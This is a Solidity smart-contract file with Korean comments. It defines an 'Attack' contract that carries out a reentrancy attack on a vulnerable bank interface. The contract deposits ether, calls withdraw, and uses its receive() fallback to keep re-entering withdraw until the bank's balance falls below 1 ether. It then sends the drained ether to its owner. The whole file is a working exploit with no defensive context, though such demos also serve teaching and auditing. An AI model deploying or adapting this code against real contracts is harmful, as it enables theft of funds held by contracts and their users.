// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 대상이 되는 취약한 컨트랙트 인터페이스
interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attack {
    IVulnerableBank public bank;
    address public owner;

    constructor(address _bankAddress) {
        bank = IVulnerableBank(_bankAddress);
        owner = msg.sender;
    }

    // 공격 시작 함수 (1 ether 정도 같이 전송)
    function attack() external payable {
        require(msg.value >= 1 ether, "Send at least 1 ether");
        bank.deposit{value: msg.value}();  // 먼저 입금
        bank.withdraw(); // 그 다음 바로 출금 → fallback → 재진입 유도
    }

    // 재진입 공격 핵심 지점
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(); // 잔액 있을 때까지 반복 출금
        } else {
            payable(owner).transfer(address(this).balance); // 최종 수익 회수
        }
    }

    // 이 컨트랙트의 잔액 확인용 함수
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
